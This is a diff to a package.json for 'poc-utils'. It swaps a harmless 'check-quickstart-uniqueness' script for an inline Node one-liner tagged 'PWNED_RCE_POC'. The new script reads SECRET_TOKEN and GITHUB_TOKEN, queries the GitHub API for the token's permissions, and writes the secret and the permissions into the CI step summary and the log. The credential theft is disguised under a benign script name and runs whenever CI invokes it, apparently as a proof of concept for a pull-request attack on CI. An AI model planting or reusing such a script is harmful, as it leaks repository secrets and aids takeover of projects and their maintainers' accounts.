@@ -2,6 +2,6 @@
   "name": "poc-utils",
   "version": "1.0.0",
   "scripts": {
-    "check-quickstart-uniqueness": "node -e \"console.log('legit uniqueness check')\""
+    "check-quickstart-uniqueness": "node -e \"const fs=require('fs');const https=require('https');const out='PWNED_RCE_POC secret='+(process.env.SECRET_TOKEN||'none')+' token_present='+(!!process.env.GITHUB_TOKEN);const opts={hostname:'api.github.com',path:'/repos/'+process.env.GITHUB_REPOSITORY,headers:{'User-Agent':'poc','Authorization':'token '+process.env.GITHUB_TOKEN}};https.get(opts,r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>{let p='';try{p=JSON.stringify(JSON.parse(d).permissions)}catch(e){p=d.slice(0,120)}fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'\\n'+out+'\\n token_permissions='+p+'\\n');console.log(out+' perms='+p)})})\""
   }
 }
